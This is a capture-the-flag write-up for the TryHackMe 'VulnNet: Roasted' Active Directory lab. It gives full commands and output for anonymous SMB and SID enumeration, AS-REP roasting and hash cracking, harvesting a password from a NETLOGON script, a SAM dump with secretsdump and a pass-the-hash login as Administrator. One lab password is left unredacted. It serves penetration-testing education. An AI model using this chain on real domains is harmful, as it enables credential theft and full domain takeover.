# VulnNet: Roasted

## Introduction:

Welcome to my another writeup! In this TryHackMe [VulnNet: Roasted](https://tryhackme.com/room/vulnnetroasted) room, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background:

> VulnNet Entertainment just deployed a new instance on their network with the newly-hired system administrators. Being a security-aware company, they as always hired you to perform a penetration test, and see how system administrators are performing.

## Difficulty:

> **Easy**

# Enumeration:

**Rustscan result:**
```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# export IP=10.10.144.147

┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 -a $IP -- -sC -sV -oN rustscan/rustscan.txt
[...]
Open 10.10.144.147:53
Open 10.10.144.147:88
Open 10.10.144.147:135
Open 10.10.144.147:139
Open 10.10.144.147:389
Open 10.10.144.147:445
Open 10.10.144.147:464
Open 10.10.144.147:593
Open 10.10.144.147:636
Open 10.10.144.147:3268
Open 10.10.144.147:3269
Open 10.10.144.147:5985
Open 10.10.144.147:9389
Open 10.10.144.147:49665
Open 10.10.144.147:49667
Open 10.10.144.147:49669
Open 10.10.144.147:49670
Open 10.10.144.147:49683
Open 10.10.144.147:49696
Open 10.10.144.147:49709
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-10 02:32 EDT
[...]
Nmap scan report for 10.10.144.147
[...]

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain?       syn-ack ttl 127
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-10 06:32:11Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49683/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-07-10T06:34:40
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53178/tcp): CLEAN (Timeout)
|   Check 2 (port 36428/tcp): CLEAN (Timeout)
|   Check 3 (port 23914/udp): CLEAN (Timeout)
|   Check 4 (port 60030/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
[...]
```

According to `rustscan` result, we have several ports are open:

Ports Open 				| Service
------------------|------------------------
53        				| DNS Server
135								| Microsoft Windows RPC
139,445						| SMB
389,636,3268,3269 | LDAP
593								| Windows RPC over HTTP
5985							| Windows RPC over HTTP
9389							| .NET Message Framing

## DNS Server On Port 53:

We could view all records in the DNS server via `dig`:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# dig $IP -t ANY   

; <<>> DiG 9.18.4-2-Debian <<>> 10.10.144.147 -t ANY
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 845
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;10.10.144.147.			IN	ANY
[...]
```

But no records in this target.

## SMB On Port 445:

By using `smbclient` to list any shared folder, I saw 4 shared folders are stand out: `NETLOGON`, `SYSVOL`, `VulnNet-Business-Anonymous`, `VulnNet-Enterprise-Anonymous`.

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# smbclient -L \\\\$IP      
Password for [WORKGROUP\nam]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
```

**NETLOGON:**

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# smbclient \\\\$IP\\NETLOGON                  
Password for [WORKGROUP\nam]:
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
```

Nothing useful here.

**SYSVOL:**

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# smbclient \\\\$IP\\SYSVOL  
Password for [WORKGROUP\nam]:
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
```

Access denied again.

**VulnNet-Business-Anonymous:**

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# smbclient \\\\$IP\\VulnNet-Business-Anonymous
Password for [WORKGROUP\nam]:
Try "help" to get a list of possible commands.
smb: \> dir
[...]
  Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021
  Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021
  Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021
```

However, those files aren't good for initial shell.

**VulnNet-Enterprise-Anonymous:**

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# smbclient \\\\$IP\\VulnNet-Enterprise-Anonymous
Password for [WORKGROUP\nam]:
Try "help" to get a list of possible commands.
smb: \> dir
[...]
  Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021
  Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021
  Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021
```

And again, nothing interesting.

### Enumerate SMB share folder Permission:

Now, let's use `smbmap` to list the permission of all the shared folder:

```
┌──(smbmap-env)─(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# python3 /opt/smbmap/smbmap.py -u 'anonymous' -p '' -H $IP 
[...]                                                                                                  
[+] IP: 10.10.24.127:445	Name: 10.10.24.127        	Status: Guest session   	
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	SYSVOL                                            	NO ACCESS	Logon server share 
	VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous                      	READ ONLY	VulnNet Enterprise Sharing
```

### Enumerate SMB users:

According to the result, we have a read access to `IPC$` without authentication. Now we able to list the domain users as `anonymous` via `lookupsid.py` in `Impacket`:

```
┌──(impacket-env)─(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# python3 /opt/impacket/examples/lookupsid.py anonymous@$IP | tee user.txt
Password:
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.24.127
[*] StringBinding ncacn_np:10.10.24.127[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

Isolate users (`SidTypeUser`):

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# grep SidTypeUser user.txt | awk '{print $2}' | cut -d "\\" -f2 > splited_user.txt
                                                                                                                               
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# cat splited_user.txt 
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

Next, we can use `GetNPUsers.py` in `Impacket` to find users without Kerberos pre-authentication:

But before we do that, we'll add the Domain Controller(DC) IP address to `/etc/hosts`.

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# cat /etc/hosts      
127.0.0.1	localhost

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters  
10.10.24.127 vulnnet-rst.local
```

> DC's domain can be found in the `rustscan` result.

```
┌──(impacket-env)─(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# python3 /opt/impacket/examples/GetNPUsers.py vulnnet-rst.local/ -no-pass -usersfile splited_user.txt
[...]
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:[Redacted]
[...]
```

We've found `t-skid`’s hash. Let’s crack it with `John The Ripper`!:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# nano t-skid_hash.txt
                                                                                                                               
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt t-skid_hash.txt 
[...]
[Redacted]        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)     
[...]
``` 

Password cracked!

`t-skid:[Redacted]`

### SMB Authenticated Access:

Armed with this information, we're now able to connect to the `NETLOGON` Samba network share: 

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# smbclient -U vulnnet-rst.local/t-skid //$IP/NETLOGON
Password for [VULNNET-RST.LOCAL\t-skid]:
[...]
smb: \> dir
[...]
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021
```

`ResetPassword.vbs` looks interesting:

```
smb: \> get ResetPassword.vbs 
[...]
smb: \> quit
                                                                                                                               
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# cat ResetPassword.vbs 
[...]
strUserNTName = "a-whitehat"
strPassword = "[Redacted]"
[...]
```

Another credential!

`a-whitehat:[Redacted]`

# Initial Access:

Since now we have a set of credential for user a-whitehat, we may try to login to `RDC` with `evil-winrm`:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# evil-winrm -i $IP -u "a-whitehat" -p <Redacted_Password>
[...]
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> whoami; hostname; ipconfig /all
vulnnet-rst\a-whitehat
WIN-2BO8M1OE1M1

Windows IP Configuration
[...]
Ethernet adapter Ethernet 2:
[...]
   IPv4 Address. . . . . . . . . . . : 10.10.24.127(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
[...]
```

```
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> net user "a-whitehat"
User name                    a-whitehat
Full Name                    Alexa Whitehat
[...]
Global Group memberships     *Domain Admins        *Domain Users
[...]
```

**user.txt**

```
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> type C:\Users\enterprise-core-vn\Desktop\user.txt
THM{Redacted}
```

# Privilege Escalation:

Since user a-whitehat is in `Domain Admins` group, we can dump the entire SAM database and get access to all the hashes from any user whose on the box, such Administrator who has higher privilege.

To do so, I'll use `secretsdump.py` in `Impacket`:

```
┌──(impacket-env)─(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# python3 /opt/impacket/examples/secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@$IP
[...]
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[Redacted]:::
[...]
```

We can now copy `Administrator`'s hash, and use it to login with `evil-winrm`:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet_Roasted]
└─# evil-winrm -i $IP -u "Administrator" -H <Redacted_Hash>                              
[...]
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
vulnnet-rst\administrator
```

# Rooted:

**system.txt**

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\system.txt
THM{Redacted}
```

# Conclusion:

What we've learned:

1. DNS Server enumeration (`dig`)
2. SMB enumeration (`smbclient`, `smbmap`)
3. Dumping users, passwords and hashes via `Impacket` scripts